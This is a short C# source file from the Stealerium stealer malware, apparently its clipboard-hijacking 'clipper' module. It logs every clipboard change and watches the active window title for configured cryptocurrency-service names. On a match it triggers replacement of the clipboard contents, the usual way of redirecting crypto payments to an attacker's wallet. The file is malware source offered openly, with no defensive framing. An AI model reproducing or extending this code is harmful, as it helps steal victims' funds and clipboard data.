using Stealerium.Helpers;
using Stealerium.Modules;

namespace Stealerium.Clipper
{
    internal sealed class EventManager
    {
        // Make something when clipboard content is changed
        public static void Action()
        {
            Logger.SaveClipboard(); // Log string
            // Start clipper only if active windows contains target values
            if (Detect()) Buffer.Replace();
        }

        // Detect target data in active window
        private static bool Detect()
        {
            string active_window = WindowManager.ActiveWindow.ToLower();
            Logging.Log(active_window);
            foreach (var text in Config.CryptoServices)
                if (active_window.Contains(text))
                {
                    Logging.Log($"Found [{text}] from [{active_window}]");
                    return true;
                }
            return false;
        }
    }
}